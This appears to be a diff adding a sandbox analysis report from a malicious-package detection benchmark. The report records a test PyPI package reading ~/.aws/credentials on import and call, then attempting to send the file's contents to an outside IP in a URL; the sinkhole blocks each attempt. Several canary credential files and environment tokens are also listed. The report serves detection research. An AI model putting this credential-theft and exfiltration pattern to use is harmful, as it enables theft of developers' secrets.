@@ -1,0 +1,442 @@
+{
+ "schema_version": "1.0",
+ "package": {
+  "name": "import-exfil",
+  "version": "0.1",
+  "ecosystem": "pypi",
+  "sha256": "0d09aa7a4c483b791c97da27887a8ceb90cdaca616ea22bd709a2cbdc80a80cd",
+  "path": "bench/packages/malicious/import_exfil"
+ },
+ "run": {
+  "sandbox": "bwrap",
+  "network": "sinkhole",
+  "canaries": [
+   "ssh_key",
+   "aws_creds",
+   "npmrc",
+   "gcloud_creds",
+   "docker_config",
+   "aws_secret_env",
+   "github_token_env"
+  ],
+  "phases": [
+   "install",
+   "startup",
+   "import",
+   "call"
+  ],
+  "profiles": [
+   "dev",
+   "ci"
+  ],
+  "variants": [
+   "default",
+   "clock+30d"
+  ],
+  "started_at": "2026-10-27T11:55:41.669000+00:00",
+  "duration_s": 4.95,
+  "stub": false,
+  "tool_versions": {
+   "python": "Python 3.12.3",
+   "bwrap": "bubblewrap 0.9.0",
+   "strace": "strace -- version 6.8",
+   "libfaketime": "/usr/lib/x86_64-linux-gnu/faketime/libfaketime.so.1"
+  }
+ },
+ "events": [
+  {
+   "id": "ev0",
+   "seq": 106,
+   "phase": "import",
+   "trigger": "import_all",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "fs_read_sensitive",
+   "detail": {
+    "path": "~/.aws/credentials",
+    "mode": "r"
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "aws_creds"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/import_exfil/__init__.py",
+    "line": 6,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev1",
+   "seq": 107,
+   "phase": "import",
+   "trigger": "import_all",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.9/aws?d=[default]\naws_access_key_id =",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/import_exfil/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev2",
+   "seq": 108,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "fs_read_sensitive",
+   "detail": {
+    "path": "~/.aws/credentials",
+    "mode": "r"
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "aws_creds"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/import_exfil/__init__.py",
+    "line": 6,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev3",
+   "seq": 109,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.9/aws?d=[default]\naws_access_key_id =",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/import_exfil/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev4",
+   "seq": 110,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "clock+30d",
+   "capability": "fs_read_sensitive",
+   "detail": {
+    "path": "~/.aws/credentials",
+    "mode": "r"
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "aws_creds"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/import_exfil/__init__.py",
+    "line": 6,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev5",
+   "seq": 111,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.9/aws?d=[default]\naws_access_key_id =",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/import_exfil/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev6",
+   "seq": 218,
+   "phase": "import",
+   "trigger": "import_all",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "fs_read_sensitive",
+   "detail": {
+    "path": "~/.aws/credentials",
+    "mode": "r"
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "aws_creds"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/import_exfil/__init__.py",
+    "line": 6,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev7",
+   "seq": 219,
+   "phase": "import",
+   "trigger": "import_all",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.9/aws?d=[default]\naws_access_key_id =",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/import_exfil/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev8",
+   "seq": 220,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "fs_read_sensitive",
+   "detail": {
+    "path": "~/.aws/credentials",
+    "mode": "r"
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "aws_creds"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/import_exfil/__init__.py",
+    "line": 6,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev9",
+   "seq": 221,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.9/aws?d=[default]\naws_access_key_id =",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/import_exfil/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev10",
+   "seq": 222,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "clock+30d",
+   "capability": "fs_read_sensitive",
+   "detail": {
+    "path": "~/.aws/credentials",
+    "mode": "r"
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "aws_creds"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/import_exfil/__init__.py",
+    "line": 6,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev11",
+   "seq": 223,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.9/aws?d=[default]\naws_access_key_id =",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/import_exfil/__init__.py",
+    "line": 7,
+    "layer": "audit"
+   }
+  }
+ ],
+ "static_signals": [],
+ "coverage": {
+  "phases_run": [
+   "install",
+   "startup",
+   "import",
+   "call"
+  ],
+  "profiles_run": [
+   "dev",
+   "ci"
+  ],
+  "variants_run": [
+   "default",
+   "clock+30d"
+  ],
+  "triggers_run": [
+   "call_all",
+   "fresh_startup",
+   "import_all",
+   "install"
+  ],
+  "install_completed": true,
+  "install_note": null,
+  "network": "sinkhole",
+  "callables_total": 1,
+  "callables_exercised": 1,
+  "native_skipped": [],
+  "strace_layer": true,
+  "not_observed": [
+   "no console-script entry points to run"
+  ],
+  "whitelisted_or_dropped_events": 212
+ },
+ "canaries": [
+  {
+   "id": "ssh_key",
+   "kind": "file",
+   "where": ".ssh/id_rsa",
+   "token": "TLCANARYSSHKEY579f09d50cae"
+  },
+  {
+   "id": "aws_creds",
+   "kind": "file",
+   "where": ".aws/credentials",
+   "token": "TLCANARYAWSCREDSfe9c4d32b45f"
+  },
+  {
+   "id": "npmrc",
+   "kind": "file",
+   "where": ".npmrc",
+   "token": "TLCANARYNPMRC66b121fdd674"
+  },
+  {
+   "id": "gcloud_creds",
+   "kind": "file",
+   "where": ".config/gcloud/application_default_credentials.json",
+   "token": "TLCANARYGCLOUDCREDS49e5f38b7c4f"
+  },
+  {
+   "id": "docker_config",
+   "kind": "file",
+   "where": ".docker/config.json",
+   "token": "TLCANARYDOCKERCONFIG75b8a9c79f64"
+  },
+  {
+   "id": "aws_secret_env",
+   "kind": "env",
+   "where": "AWS_SECRET_ACCESS_KEY",
+   "token": "TLCANARYAWSSECRETENV4ca25a866e64"
+  },
+  {
+   "id": "github_token_env",
+   "kind": "env",
+   "where": "GITHUB_TOKEN",
+   "token": "TLCANARYGITHUBTOKENENV3635f584c618"
+  }
+ ],
+ "capability_summary": {
+  "fs_read_sensitive": {
+   "phases": [
+    "call",
+    "import"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "conditional": false,
+   "count": 6,
+   "canary_hit": true
+  },
+  "network": {
+   "phases": [
+    "call",
+    "import"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "conditional": false,
+   "count": 6,
+   "canary_hit": false
+  }
+ }
+}
